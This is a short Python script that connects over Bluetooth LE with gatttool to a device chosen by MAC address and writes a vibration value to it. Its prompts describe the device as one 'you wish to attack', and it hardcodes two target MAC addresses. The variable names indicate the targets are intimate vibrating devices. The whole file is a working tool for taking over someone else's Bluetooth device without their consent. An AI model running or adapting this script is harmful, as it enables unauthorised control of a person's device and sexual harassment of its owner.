#!/usr/bin/env python3
import platform
import pexpect
import time

os = platform.system()

if os == "Windows":
    print("Windows is detected")

elif os == "Linux":
    print("Linux is detected")

elif os == "Darwin":
    print("MacOS detected")
else:
    print("Unsure what os is running")


print("Ensure you have the mac address of the device you wish to attack")

print("Enter the mac address")
dildo = input("")


if dildo == ("flam"):
    dildo = ("50:F1:4A:56:70:11")
    print("Flamingo mode")

if dildo == ("verge"):
    dildo = ("50:8C:B1:44:8A:AB")
    print("Verge mode")

print("Enter the vibration")
vibration = input("")

print("gatttool is starting up")
child = pexpect.spawn("gatttool -I")
child.sendline(f"connect {dildo}")
child.expect("Connection successful"),
command=f"char-write-req {vibration}"
time.sleep(5)
child.sendline(command)
child.expect("Characteristic value was written successfully", timeout=10)
